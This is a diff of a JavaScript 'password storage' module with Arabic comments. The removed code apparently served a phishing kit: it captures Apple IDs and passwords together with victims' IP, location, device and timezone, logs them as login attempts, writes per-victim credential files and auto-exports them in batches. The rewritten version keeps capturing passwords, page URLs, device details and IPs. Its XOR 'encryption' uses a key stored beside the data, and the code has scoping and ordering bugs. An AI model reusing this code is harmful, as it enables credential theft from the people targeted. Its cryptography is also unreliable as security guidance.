@@ -1,619 +1,726 @@
-// 📁 password-storage.js - نظام تخزين كلمات المرور المتقدم
+// 📁 password-storage.js - نظام تخزين كلمات المرور الآمن
 
-class PasswordStorageSystem {
+class PasswordStorage {
     constructor() {
-        this.storageKey = 'apple_password_vault';
-        this.encryptionKey = this.generateEncryptionKey();
+        this.version = '2.0.0';
         this.passwords = [];
-        this.backupInterval = 300000; // 5 دقائق
-        this.init();
+        this.encryptionKey = null;
+        this.settings = {
+            autoSave: true,
+            encryption: true,
+            backup: true,
+            maxPasswords: 1000,
+            sessionTimeout: 30 * 60 * 1000 // 30 دقيقة
+        };
+        
+        this.initialize();
     }
     
     // تهيئة النظام
-    init() {
-        this.loadPasswords();
-        this.setupBackup();
-        this.setupAutoExport();
-        this.setupSecurity();
-        console.log('🔐 نظام تخزين كلمات المرور جاهز');
+    async initialize() {
+        console.log(`🔐 Password Storage v${this.version} initializing...`);
+        
+        // تحميل الإعدادات
+        this.loadSettings();
+        
+        // تحميل كلمات المرور
+        await this.loadPasswords();
+        
+        // إعداد التشفير
+        await this.setupEncryption();
+        
+        // بدء مراقبة الجلسة
+        this.startSessionMonitoring();
+        
+        console.log('✅ Password Storage ready');
     }
     
-    // توليد مفتاح تشفير
-    generateEncryptionKey() {
-        // استخدام معرف فريد للمستخدم + الطابع الزمني
-        const userId = localStorage.getItem('user_id') || 
-                      'guest_' + Math.random().toString(36).substr(2, 9);
-        const timestamp = Date.now().toString(36);
-        return btoa(userId + '_' + timestamp).substr(0, 32);
-    }
-    
-    // تشفير البيانات
-    encrypt(data) {
+    // تحميل الإعدادات
+    loadSettings() {
         try {
-            const text = JSON.stringify(data);
-            let result = '';
-            for (let i = 0; i < text.length; i++) {
-                const charCode = text.charCodeAt(i) ^ this.encryptionKey.charCodeAt(i % this.encryptionKey.length);
-                result += String.fromCharCode(charCode);
+            const saved = localStorage.getItem('password_storage_settings');
+            if (saved) {
+                this.settings = { ...this.settings, ...JSON.parse(saved) };
             }
-            return btoa(result);
         } catch (error) {
-            console.error('خطأ في التشفير:', error);
-            return JSON.stringify(data);
-        }
-    }
-    
-    // فك التشفير
-    decrypt(encryptedData) {
-        try {
-            const text = atob(encryptedData);
-            let result = '';
-            for (let i = 0; i < text.length; i++) {
-                const charCode = text.charCodeAt(i) ^ this.encryptionKey.charCodeAt(i % this.encryptionKey.length);
-                result += String.fromCharCode(charCode);
-            }
-            return JSON.parse(result);
-        } catch (error) {
-            console.error('خطأ في فك التشفير:', error);
-            try {
-                return JSON.parse(encryptedData);
-            } catch {
-                return null;
-            }
+            console.warn('⚠️ Settings load error:', error);
         }
     }
     
     // تحميل كلمات المرور
-    loadPasswords() {
+    async loadPasswords() {
         try {
-            const encrypted = localStorage.getItem(this.storageKey);
-            if (encrypted) {
-                this.passwords = this.decrypt(encrypted) || [];
-                console.log(`🔑 تم تحميل ${this.passwords.length} كلمة مرور`);
+            const saved = localStorage.getItem('encrypted_passwords');
+            if (saved) {
+                if (this.settings.encryption && this.encryptionKey) {
+                    const decrypted = await this.decryptData(saved);
+                    this.passwords = JSON.parse(decrypted) || [];
+                } else {
+                    this.passwords = JSON.parse(saved) || [];
+                }
             }
+            
+            console.log(`🔑 Loaded ${this.passwords.length} passwords`);
+            
         } catch (error) {
-            console.error('خطأ في تحميل كلمات المرور:', error);
+            console.warn('⚠️ Password load error:', error);
             this.passwords = [];
         }
     }
     
-    // حفظ كلمات المرور
-    savePasswords() {
+    // إعداد التشفير
+    async setupEncryption() {
+        if (!this.settings.encryption) return;
+        
         try {
-            const encrypted = this.encrypt(this.passwords);
-            localStorage.setItem(this.storageKey, encrypted);
+            // محاولة استخدام مفتاح موجود
+            let key = localStorage.getItem('password_encryption_key');
             
-            // تسجيل في kelog
-            if (window.kelogSystem) {
-                window.kelogSystem.log('حفظ كلمات المرور', {
-                    count: this.passwords.length,
-                    encrypted: true
-                }, 'security');
+            if (!key) {
+                // إنشاء مفتاح جديد
+                key = this.generateEncryptionKey();
+                localStorage.setItem('password_encryption_key', key);
             }
             
-            return true;
+            this.encryptionKey = key;
+            console.log('🔐 Encryption setup complete');
+            
         } catch (error) {
-            console.error('خطأ في حفظ كلمات المرور:', error);
-            return false;
+            console.warn('⚠️ Encryption setup error:', error);
+            this.settings.encryption = false;
         }
     }
     
-    // إضافة كلمة مرور
-    addPassword(appleId, password, metadata = {}) {
-        const passwordEntry = {
-            id: this.generateId(),
-            appleId: appleId,
-            password: password,
-            timestamp: new Date().toISOString(),
-            ip: metadata.ip || 'unknown',
-            userAgent: metadata.userAgent || navigator.userAgent,
-            screen: metadata.screen || `${screen.width}x${screen.height}`,
-            location: metadata.location || 'unknown',
-            timezone: metadata.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
-            additionalData: metadata.additionalData || {}
-        };
+    // توليد مفتاح تشفير
+    generateEncryptionKey() {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()';
+        let key = '';
         
-        this.passwords.push(passwordEntry);
-        this.savePasswords();
-        
-        // تسجيل في kelog
-        if (window.kelogSystem) {
-            window.kelogSystem.logLoginAttempt(appleId, metadata.ip || 'unknown', true, {
-                passwordLength: password.length,
-                hasSpecialChars: /[!@#$%^&*]/.test(password)
-            });
+        for (let i = 0; i < 32; i++) {
+            key += chars.charAt(Math.floor(Math.random() * chars.length));
         }
         
-        // إنشاء ملف نصي للكلمة المرور
-        this.createPasswordFile(passwordEntry);
+        return key;
+    }
+    
+    // تشفير البيانات
+    async encryptData(data) {
+        if (!this.settings.encryption || !this.encryptionKey) {
+            return data;
+        }
         
-        console.log('🔐 تم إضافة كلمة مرور جديدة:', appleId);
-        return passwordEntry.id;
+        try {
+            // تشفير بسيط باستخدام XOR (يمكن استبداله بمكتبة تشفير أقوى)
+            const str = JSON.stringify(data);
+            let encrypted = '';
+            
+            for (let i = 0; i < str.length; i++) {
+                const keyChar = this.encryptionKey.charCodeAt(i % this.encryptionKey.length);
+                encrypted += String.fromCharCode(str.charCodeAt(i) ^ keyChar);
+            }
+            
+            return btoa(encrypted);
+            
+        } catch (error) {
+            console.warn('⚠️ Encryption error:', error);
+            return data;
+        }
+    }
+    
+    // فك تشفير البيانات
+    async decryptData(encrypted) {
+        if (!this.settings.encryption || !this.encryptionKey) {
+            return encrypted;
+        }
+        
+        try {
+            const decoded = atob(encrypted);
+            let decrypted = '';
+            
+            for (let i = 0; i < decoded.length; i++) {
+                const keyChar = this.encryptionKey.charCodeAt(i % this.encryptionKey.length);
+                decrypted += String.fromCharCode(decoded.charCodeAt(i) ^ keyChar);
+            }
+            
+            return decrypted;
+            
+        } catch (error) {
+            console.warn('⚠️ Decryption error:', error);
+            return encrypted;
+        }
+    }
+    
+    // حفظ كلمة المرور
+    async savePassword(passwordData) {
+        try {
+            // التحقق من البيانات
+            if (!passwordData || !passwordData.password) {
+                throw new Error('Invalid password data');
+            }
+            
+            // إنشاء سجل جديد
+            const passwordRecord = {
+                id: this.generateId(),
+                timestamp: new Date().toISOString(),
+                ...passwordData,
+                metadata: {
+                    userAgent: navigator.userAgent,
+                    url: window.location.href,
+                    device: this.getDeviceInfo(),
+                    ip: await this.getIPAddress()
+                }
+            };
+            
+            // تحليل كلمة المرور
+            passwordRecord.analysis = this.analyzePassword(passwordData.password);
+            
+            // إضافة إلى القائمة
+            this.passwords.push(passwordRecord);
+            
+            // الاحتفاظ بعدد محدود
+            if (this.passwords.length > this.settings.maxPasswords) {
+                this.passwords = this.passwords.slice(-this.settings.maxPasswords);
+            }
+            
+            // حفظ التغييرات
+            await this.saveAllPasswords();
+            
+            // إنشاء نسخة احتياطية
+            if (this.settings.backup) {
+                await this.createBackup();
+            }
+            
+            console.log('💾 Password saved:', passwordRecord.id);
+            
+            return {
+                success: true,
+                id: passwordRecord.id,
+                analysis: passwordRecord.analysis
+            };
+            
+        } catch (error) {
+            console.error('❌ Password save error:', error);
+            return {
+                success: false,
+                error: error.message
+            };
+        }
     }
     
     // توليد معرف فريد
     generateId() {
-        return 'pass_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        return 'pwd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
     }
     
-    // الحصول على جميع كلمات المرور
-    getAllPasswords() {
-        return [...this.passwords].reverse(); // أحدث أولاً
+    // الحصول على معلومات الجهاز
+    getDeviceInfo() {
+        const ua = navigator.userAgent.toLowerCase();
+        let device = 'desktop';
+        
+        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+            device = 'tablet';
+        } else if (/mobile|iphone|ipod|android|blackberry|opera mini|opera mobi/i.test(ua)) {
+            device = 'mobile';
+        }
+        
+        return {
+            type: device,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`
+        };
     }
     
-    // البحث عن كلمات مرور
-    searchPasswords(query) {
-        const searchTerm = query.toLowerCase();
-        return this.passwords.filter(pass =>
-            pass.appleId.toLowerCase().includes(searchTerm) ||
-            pass.ip.toLowerCase().includes(searchTerm) ||
-            JSON.stringify(pass.additionalData).toLowerCase().includes(searchTerm)
-        ).reverse();
+    // الحصول على عنوان IP
+    async getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'unknown';
+        }
     }
     
-    // الحصول على كلمة مرور بواسطة المعرف
-    getPasswordById(id) {
-        return this.passwords.find(pass => pass.id === id);
+    // تحليل كلمة المرور
+    analyzePassword(password) {
+        const analysis = {
+            length: password.length,
+            hasUpperCase: /[A-Z]/.test(password),
+            hasLowerCase: /[a-z]/.test(password),
+            hasNumbers: /\d/.test(password),
+            hasSpecial: /[^A-Za-z0-9]/.test(password),
+            commonPatterns: this.detectCommonPatterns(password),
+            strength: this.calculatePasswordStrength(password),
+            entropy: this.calculateEntropy(password)
+        };
+        
+        return analysis;
     }
     
-    // حذف كلمة مرور
-    deletePassword(id) {
-        const index = this.passwords.findIndex(pass => pass.id === id);
-        if (index !== -1) {
-            const deleted = this.passwords.splice(index, 1)[0];
-            this.savePasswords();
+    // اكتشاف الأنماط الشائعة
+    detectCommonPatterns(password) {
+        const patterns = [];
+        
+        // تسلسلات لوحة المفاتيح
+        const keyboardPatterns = [
+            'qwerty', 'asdfgh', 'zxcvbn', '123456', 'password',
+            'admin', 'welcome', 'qwertyuiop', '1q2w3e4r', '1qaz2wsx'
+        ];
+        
+        keyboardPatterns.forEach(pattern => {
+            if (password.toLowerCase().includes(pattern)) {
+                patterns.push(`keyboard_pattern_${pattern}`);
+            }
+        });
+        
+        // التواريخ
+        const datePattern = /\d{4}|\d{2}[-/]\d{2}[-/]\d{2,4}/;
+        if (datePattern.test(password)) {
+            patterns.push('contains_date');
+        }
+        
+        // أسماء شائعة
+        const commonNames = ['john', 'michael', 'david', 'maria', 'anna'];
+        commonNames.forEach(name => {
+            if (password.toLowerCase().includes(name)) {
+                patterns.push(`common_name_${name}`);
+            }
+        });
+        
+        return patterns;
+    }
+    
+    // حساب قوة كلمة المرور
+    calculatePasswordStrength(password) {
+        let score = 0;
+        
+        // الطول
+        if (password.length >= 8) score += 1;
+        if (password.length >= 12) score += 1;
+        if (password.length >= 16) score += 1;
+        
+        // التعقيد
+        if (/[a-z]/.test(password)) score += 1;
+        if (/[A-Z]/.test(password)) score += 1;
+        if (/\d/.test(password)) score += 1;
+        if (/[^A-Za-z0-9]/.test(password)) score += 1;
+        
+        // التقييم
+        if (score <= 3) return 'very_weak';
+        if (score <= 5) return 'weak';
+        if (score <= 7) return 'medium';
+        if (score <= 9) return 'strong';
+        return 'very_strong';
+    }
+    
+    // حساب الإنتروبيا
+    calculateEntropy(password) {
+        const charsetSize = this.getCharsetSize(password);
+        const entropy = Math.log2(Math.pow(charsetSize, password.length));
+        return Math.round(entropy * 100) / 100;
+    }
+    
+    // حساب حجم مجموعة الأحرف
+    getCharsetSize(password) {
+        let size = 0;
+        if (/[a-z]/.test(password)) size += 26;
+        if (/[A-Z]/.test(password)) size += 26;
+        if (/\d/.test(password)) size += 10;
+        if (/[^A-Za-z0-9]/.test(password)) size += 32; // تقدير للأحرف الخاصة
+        
+        return size || 1;
+    }
+    
+    // حفظ جميع كلمات المرور
+    async saveAllPasswords() {
+        try {
+            let dataToSave = JSON.stringify(this.passwords);
             
-            // تسجيل في kelog
-            if (window.kelogSystem) {
-                window.kelogSystem.log('حذف كلمة مرور', {
-                    appleId: deleted.appleId,
-                    id: id
-                }, 'security');
+            // تشفير إذا كان مفعلاً
+            if (this.settings.encryption && this.encryptionKey) {
+                dataToSave = await this.encryptData(dataToSave);
             }
             
+            localStorage.setItem('encrypted_passwords', dataToSave);
+            
+            // تحديث timestamp
+            localStorage.setItem('passwords_last_save', Date.now().toString());
+            
             return true;
-        }
-        return false;
-    }
-    
-    // حذف جميع كلمات المرور
-    clearAllPasswords() {
-        const count = this.passwords.length;
-        this.passwords = [];
-        this.savePasswords();
-        
-        // تسجيل في kelog
-        if (window.kelogSystem) {
-            window.kelogSystem.log('حذف جميع كلمات المرور', {
-                count: count
-            }, 'security');
-        }
-        
-        return count;
-    }
-    
-    // إعداد النسخ الاحتياطي
-    setupBackup() {
-        setInterval(() => {
-            this.createBackup();
-        }, this.backupInterval);
-    }
-    
-    // إنشاء نسخة احتياطية
-    createBackup() {
-        try {
-            const backupData = {
-                passwords: this.passwords,
-                backupTime: new Date().toISOString(),
-                count: this.passwords.length
-            };
             
-            const backupKey = `${this.storageKey}_backup_${Date.now()}`;
-            const encryptedBackup = this.encrypt(backupData);
-            
-            localStorage.setItem(backupKey, encryptedBackup);
-            
-            // الاحتفاظ بـ 5 نسخ احتياطية فقط
-            this.cleanupOldBackups();
-            
-            console.log('💾 تم إنشاء نسخة احتياطية');
-            return true;
         } catch (error) {
-            console.error('خطأ في إنشاء النسخة الاحتياطية:', error);
+            console.error('❌ Save all passwords error:', error);
             return false;
         }
     }
     
-    // تنظيف النسخ الاحتياطية القديمة
-    cleanupOldBackups() {
-        const backupKeys = [];
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key.startsWith(`${this.storageKey}_backup_`)) {
-                backupKeys.push(key);
+    // إنشاء نسخة احتياطية
+    async createBackup() {
+        try {
+            const backup = {
+                id: `backup_${Date.now()}`,
+                timestamp: new Date().toISOString(),
+                count: this.passwords.length,
+                passwords: this.passwords.slice(-100), // آخر 100 كلمة مرور
+                metadata: {
+                    userAgent: navigator.userAgent,
+                    device: this.getDeviceInfo()
+                }
+            };
+            
+            const backups = JSON.parse(localStorage.getItem('password_backups') || '[]');
+            backups.push(backup);
+            
+            // الاحتفاظ بـ 10 نسخ فقط
+            if (backups.length > 10) {
+                backups.splice(0, backups.length - 10);
             }
-        }
-        
-        // الاحتفاظ بـ 5 نسخ فقط
-        if (backupKeys.length > 5) {
-            backupKeys.sort().slice(0, backupKeys.length - 5).forEach(key => {
-                localStorage.removeItem(key);
-            });
+            
+            localStorage.setItem('password_backups', JSON.stringify(backups));
+            
+            console.log('💾 Password backup created');
+            
+            return backup.id;
+            
+        } catch (error) {
+            console.warn('⚠️ Backup error:', error);
+            return null;
         }
     }
     
     // استعادة من نسخة احتياطية
-    restoreFromBackup(backupKey) {
+    async restoreBackup(backupId) {
         try {
-            const encrypted = localStorage.getItem(backupKey);
-            if (encrypted) {
-                const backupData = this.decrypt(encrypted);
-                this.passwords = backupData.passwords || [];
-                this.savePasswords();
-                
-                // تسجيل في kelog
-                if (window.kelogSystem) {
-                    window.kelogSystem.log('استعادة من نسخة احتياطية', {
-                        backupKey: backupKey,
-                        count: this.passwords.length
-                    }, 'system');
-                }
-                
-                return true;
+            const backups = JSON.parse(localStorage.getItem('password_backups') || '[]');
+            const backup = backups.find(b => b.id === backupId);
+            
+            if (!backup) {
+                throw new Error('Backup not found');
             }
+            
+            this.passwords = backup.passwords;
+            await this.saveAllPasswords();
+            
+            console.log('🔄 Backup restored:', backupId);
+            
+            return {
+                success: true,
+                count: backup.passwords.length
+            };
+            
         } catch (error) {
-            console.error('خطأ في الاستعادة:', error);
+            console.error('❌ Restore error:', error);
+            return {
+                success: false,
+                error: error.message
+            };
         }
-        return false;
     }
     
-    // إعداد التصدير التلقائي
-    setupAutoExport() {
-        // تصدير تلقائي كل 10 تسجيلات
-        let exportCounter = 0;
-        const originalAdd = this.addPassword.bind(this);
+    // البحث في كلمات المرور
+    searchPasswords(query, options = {}) {
+        const {
+            field = 'all', // all, website, username, email, password
+            exactMatch = false,
+            limit = 100
+        } = options;
         
-        this.addPassword = function(appleId, password, metadata) {
-            const id = originalAdd(appleId, password, metadata);
-            exportCounter++;
+        let results = this.passwords;
+        
+        if (query) {
+            const searchStr = query.toLowerCase();
             
-            if (exportCounter >= 10) {
-                this.exportPasswords('auto');
-                exportCounter = 0;
-            }
-            
-            return id;
+            results = results.filter(record => {
+                if (field === 'all') {
+                    return (
+                        (record.website && record.website.toLowerCase().includes(searchStr)) ||
+                        (record.username && record.username.toLowerCase().includes(searchStr)) ||
+                        (record.email && record.email.toLowerCase().includes(searchStr)) ||
+                        (record.password && record.password.toLowerCase().includes(searchStr))
+                    );
+                } else if (record[field]) {
+                    const fieldValue = String(record[field]).toLowerCase();
+                    return exactMatch ? 
+                        fieldValue === searchStr : 
+                        fieldValue.includes(searchStr);
+                }
+                return false;
+            });
+        }
+        
+        // ترتيب حسب الوقت (الأحدث أولاً)
+        results.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+        
+        return results.slice(0, limit);
+    }
+    
+    // الحصول على إحصائيات
+    getStatistics() {
+        const stats = {
+            total: this.passwords.length,
+            byStrength: {
+                very_weak: 0,
+                weak: 0,
+                medium: 0,
+                strong: 0,
+                very_strong: 0
+            },
+            byDevice: {},
+            last24Hours: 0,
+            lastHour: 0
         };
+        
+        const now = Date.now();
+        const dayAgo = now - 24 * 60 * 60 * 1000;
+        const hourAgo = now - 60 * 60 * 1000;
+        
+        this.passwords.forEach(pwd => {
+            // حسب القوة
+            const strength = pwd.analysis?.strength || 'unknown';
+            stats.byStrength[strength] = (stats.byStrength[strength] || 0) + 1;
+            
+            // حسب الجهاز
+            const device = pwd.metadata?.device?.type || 'unknown';
+            stats.byDevice[device] = (stats.byDevice[device] || 0) + 1;
+            
+            // حسب الوقت
+            const pwdTime = new Date(pwd.timestamp).getTime();
+            if (pwdTime > dayAgo) stats.last24Hours++;
+            if (pwdTime > hourAgo) stats.lastHour++;
+        });
+        
+        return stats;
     }
     
     // تصدير كلمات المرور
-    exportPasswords(type = 'manual') {
-        if (this.passwords.length === 0) {
-            console.warn('لا توجد كلمات مرور للتصدير');
-            return null;
+    exportPasswords(format = 'json', options = {}) {
+        const {
+            includeAnalysis = true,
+            includeMetadata = true,
+            password = true
+        } = options;
+        
+        let dataToExport = this.passwords;
+        
+        // تطبيق الفلاتر
+        if (!password) {
+            dataToExport = dataToExport.map(pwd => ({
+                ...pwd,
+                password: '***REDACTED***'
+            }));
         }
         
-        const exportData = {
-            type: 'password_export',
-            exportTime: new Date().toISOString(),
-            count: this.passwords.length,
-            passwords: this.passwords,
-            system: 'Apple Password Vault'
-        };
-        
-        const formats = ['txt', 'json', 'csv'];
-        const files = {};
-        
-        formats.forEach(format => {
-            files[format] = this.convertToFormat(exportData, format);
-        });
-        
-        // تسجيل في kelog
-        if (window.kelogSystem) {
-            window.kelogSystem.log('تصدير كلمات المرور', {
-                type: type,
-                count: this.passwords.length,
-                formats: formats
-            }, 'security');
+        if (!includeAnalysis) {
+            dataToExport = dataToExport.map(({ analysis, ...rest }) => rest);
         }
         
-        return files;
-    }
-    
-    // تحويل إلى تنسيق معين
-    convertToFormat(data, format) {
-        switch (format) {
-            case 'txt':
-                return this.convertToTXT(data);
-                
+        if (!includeMetadata) {
+            dataToExport = dataToExport.map(({ metadata, ...rest }) => rest);
+        }
+        
+        let content, filename, mimeType;
+        
+        switch(format) {
             case 'json':
-                return JSON.stringify(data, null, 2);
+                content = JSON.stringify(dataToExport, null, 2);
+                filename = `passwords_export_${Date.now()}.json`;
+                mimeType = 'application/json';
+                break;
                 
             case 'csv':
-                return this.convertToCSV(data);
+                content = this.convertToCSV(dataToExport);
+                filename = `passwords_export_${Date.now()}.csv`;
+                mimeType = 'text/csv';
+                break;
+                
+            case 'txt':
+                content = this.convertToTXT(dataToExport);
+                filename = `passwords_export_${Date.now()}.txt`;
+                mimeType = 'text/plain';
+                break;
                 
             default:
-                return '';
+                throw new Error(`Unsupported format: ${format}`);
         }
-    }
-    
-    // تحويل إلى نص
-    convertToTXT(data) {
-        let text = '='.repeat(80) + '\n';
-        text += '🔐 مخزن كلمات مرور Apple\n';
-        text += '='.repeat(80) + '\n\n';
         
-        text += `📊 الإحصائيات:\n`;
-        text += `• إجمالي كلمات المرور: ${data.count}\n`;
-        text += `• وقت التصدير: ${new Date(data.exportTime).toLocaleString('ar-SA')}\n`;
-        text += `• النظام: ${data.system}\n\n`;
-        
-        text += '📝 كلمات المرور:\n';
-        text += '─'.repeat(60) + '\n\n';
-        
-        data.passwords.forEach((pass, index) => {
-            text += `السجل ${index + 1}\n`;
-            text += '─'.repeat(40) + '\n';
-            text += `🆔 المعرف: ${pass.id}\n`;
-            text += `📧 Apple ID: ${pass.appleId}\n`;
-            text += `🔑 كلمة المرور: ${pass.password}\n`;
-            text += `🕒 الوقت: ${new Date(pass.timestamp).toLocaleString('ar-SA')}\n`;
-            text += `🌐 IP: ${pass.ip}\n`;
-            text += `📍 الموقع: ${pass.location}\n`;
-            text += `🕐 المنطقة الزمنية: ${pass.timezone}\n`;
-            text += `📱 الجهاز: ${pass.userAgent?.substring(0, 80) || 'غير معروف'}\n`;
-            text += `📊 الشاشة: ${pass.screen}\n`;
-            
-            if (pass.additionalData && Object.keys(pass.additionalData).length > 0) {
-                text += `📎 بيانات إضافية: ${JSON.stringify(pass.additionalData, null, 2)}\n`;
-            }
-            
-            text += '\n' + '='.repeat(60) + '\n\n';
-        });
-        
-        return text;
+        return { content, filename, mimeType };
     }
     
     // تحويل إلى CSV
-    convertToCSV(data) {
-        let csv = 'ID,AppleID,Password,Time,IP,Location,Timezone,UserAgent,Screen\n';
+    convertToCSV(passwords) {
+        if (passwords.length === 0) return '';
         
-        data.passwords.forEach(pass => {
-            csv += `"${pass.id}","${pass.appleId}","${pass.password}","${pass.timestamp}",`;
-            csv += `"${pass.ip}","${pass.location}","${pass.timezone}",`;
-            csv += `"${pass.userAgent || ''}","${pass.screen}"\n`;
+        const headers = ['Timestamp', 'Website', 'Username', 'Email', 'Password', 'Strength', 'Length'];
+        let csv = headers.join(',') + '\n';
+        
+        passwords.forEach(pwd => {
+            const row = [
+                `"${pwd.timestamp}"`,
+                `"${pwd.website || 'N/A'}"`,
+                `"${pwd.username || 'N/A'}"`,
+                `"${pwd.email || 'N/A'}"`,
+                `"${pwd.password || 'N/A'}"`,
+                `"${pwd.analysis?.strength || 'N/A'}"`,
+                `"${pwd.analysis?.length || '0'}"`
+            ];
+            
+            csv += row.join(',') + '\n';
         });
         
         return csv;
     }
     
-    // إنشاء ملف نصي لكلمة المرور
-    createPasswordFile(passwordEntry) {
-        const content = `
-========================================
-🔐 بيانات تسجيل دخول Apple
-========================================
-📧 Apple ID: ${passwordEntry.appleId}
-🔑 كلمة المرور: ${passwordEntry.password}
-🌐 عنوان IP: ${passwordEntry.ip}
-🕒 الوقت: ${new Date(passwordEntry.timestamp).toLocaleString('ar-SA')}
-📍 الموقع: ${passwordEntry.location}
-🕐 المنطقة الزمنية: ${passwordEntry.timezone}
-📱 الجهاز: ${passwordEntry.userAgent}
-📊 دقة الشاشة: ${passwordEntry.screen}
-========================================
-تم التسجيل تلقائياً بواسطة نظام تخزين كلمات مرور Apple
-        `.trim();
+    // تحويل إلى نص
+    convertToTXT(passwords) {
+        let txt = '='.repeat(80) + '\n';
+        txt += 'PASSWORD STORAGE EXPORT\n';
+        txt += '='.repeat(80) + '\n\n';
         
-        // حفظ في localStorage للوصول السريع
-        const fileKey = `password_file_${passwordEntry.id}`;
-        localStorage.setItem(fileKey, content);
+        txt += `Total Passwords: ${passwords.length}\n`;
+        txt += `Export Time: ${new Date().toLocaleString('de-DE')}\n\n`;
         
-        // إضافة إلى قائمة الملفات
-        this.addToFileList(passwordEntry.id, fileKey);
-        
-        return fileKey;
-    }
-    
-    // إضافة إلى قائمة الملفات
-    addToFileList(id, fileKey) {
-        const fileList = JSON.parse(localStorage.getItem('password_files') || '[]');
-        fileList.push({ id, fileKey, time: new Date().toISOString() });
-        localStorage.setItem('password_files', JSON.stringify(fileList));
-    }
-    
-    // تحميل ملف كلمة المرور
-    downloadPasswordFile(id) {
-        const fileKey = `password_file_${id}`;
-        const content = localStorage.getItem(fileKey);
-        
-        if (content) {
-            const blob = new Blob([content], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `apple_password_${id}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
+        passwords.forEach((pwd, index) => {
+            txt += `[${index + 1}] ${pwd.timestamp}\n`;
+            txt += `   Website: ${pwd.website || 'N/A'}\n`;
+            txt += `   Username: ${pwd.username || 'N/A'}\n`;
+            txt += `   Email: ${pwd.email || 'N/A'}\n`;
+            txt += `   Password: ${pwd.password || 'N/A'}\n`;
+            txt += `   Strength: ${pwd.analysis?.strength || 'N/A'}\n`;
+            txt += `   Length: ${pwd.analysis?.length || '0'} characters\n`;
             
-            return true;
+            if (pwd.metadata?.device) {
+                txt += `   Device: ${pwd.metadata.device.type}\n`;
+            }
+            
+            txt += '-'.repeat(60) + '\n';
+        });
+        
+        return txt;
+    }
+    
+    // بدء مراقبة الجلسة
+    startSessionMonitoring() {
+        // إعادة تعيين المهلة عند التفاعل
+        const resetTimeout = () => {
+            if (this.sessionTimeout) {
+                clearTimeout(this.sessionTimeout);
+            }
+            
+            this.sessionTimeout = setTimeout(() => {
+                this.clearSession();
+            }, this.settings.sessionTimeout);
+        };
+        
+        // إعادة تعيين عند التفاعل مع الصفحة
+        document.addEventListener('click', resetTimeout);
+        document.addEventListener('keypress', resetTimeout);
+        document.addEventListener('mousemove', resetTimeout);
+        
+        // بدء المهلة
+        resetTimeout();
+    }
+    
+    // مسح بيانات الجلسة
+    clearSession() {
+        console.log('🔒 Clearing session data...');
+        
+        // هنا يمكنك إضافة منطق لمسح البيانات الحساسة من الذاكرة
+        // لكننا نحتفظ بالبيانات في localStorage للاستخدام المستقبلي
+        
+        // إعادة تعيين المهلة
+        if (this.sessionTimeout) {
+            clearTimeout(this.sessionTimeout);
+            this.sessionTimeout = null;
+        }
+    }
+    
+    // تغيير مفتاح التشفير
+    async changeEncryptionKey(newKey) {
+        if (!newKey || newKey.length < 8) {
+            throw new Error('Encryption key must be at least 8 characters');
         }
         
-        return false;
-    }
-    
-    // تحميل جميع ملفات كلمات المرور
-    downloadAllPasswordFiles() {
-        const fileList = JSON.parse(localStorage.getItem('password_files') || '[]');
-        
-        if (fileList.length === 0) {
-            return false;
+        try {
+            const oldKey = this.encryptionKey;
+            this.encryptionKey = newKey;
+            
+            // إعادة تشفير جميع البيانات بالمفتاح الجديد
+            await this.saveAllPasswords();
+            
+            localStorage.setItem('password_encryption_key', newKey);
+            
+            console.log('🔐 Encryption key changed');
+            
+            return {
+                success: true,
+                message: 'Encryption key changed successfully'
+            };
+            
+        } catch (error) {
+            console.error('❌ Key change error:', error);
+            
+            // استعادة المفتاح القديم في حالة الخطأ
+            this.encryptionKey = oldKey;
+            
+            return {
+                success: false,
+                error: error.message
+            };
         }
-        
-        // إنشاء ملف ZIP افتراضي (يمكن استبداله بمكتبة ZIP حقيقية)
-        let combinedContent = '';
-        
-        fileList.forEach(file => {
-            const content = localStorage.getItem(file.fileKey);
-            if (content) {
-                combinedContent += content + '\n\n' + '='.repeat(60) + '\n\n';
-            }
-        });
-        
-        const blob = new Blob([combinedContent], { type: 'text/plain' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `all_apple_passwords_${Date.now()}.txt`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        
-        return true;
     }
     
-    // إعداد الأمان
-    setupSecurity() {
-        // منع النسخ من الحقول المحمية
-        document.addEventListener('copy', (e) => {
-            if (e.target.classList.contains('password-field')) {
-                e.preventDefault();
-                alert('لا يمكن نسخ كلمات المرور لأسباب أمنية');
-            }
-        });
-        
-        // منع لقطة الشاشة (حماية أساسية)
-        document.addEventListener('keydown', (e) => {
-            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'S') {
-                console.log('تم منع لقطة الشاشة لأسباب أمنية');
-                // يمكن إضافة المزيد من الحماية هنا
-            }
-        });
+    // حذف جميع كلمات المرور
+    async deleteAllPasswords() {
+        try {
+            this.passwords = [];
+            localStorage.removeItem('encrypted_passwords');
+            localStorage.removeItem('password_backups');
+            
+            console.log('🗑️ All passwords deleted');
+            
+            return {
+                success: true,
+                message: 'All passwords deleted'
+            };
+            
+        } catch (error) {
+            console.error('❌ Delete error:', error);
+            return {
+                success: false,
+                error: error.message
+            };
+        }
     }
     
-    // تحليل إحصائي لكلمات المرور
-    analyzePasswords() {
-        const analysis = {
-            total: this.passwords.length,
-            byLength: {},
-            strength: {
-                weak: 0,
-                medium: 0,
-                strong: 0
+    // الحصول على تقرير النظام
+    getSystemReport() {
+        const stats = this.getStatistics();
+        
+        return {
+            version: this.version,
+            settings: this.settings,
+            statistics: stats,
+            encryption: {
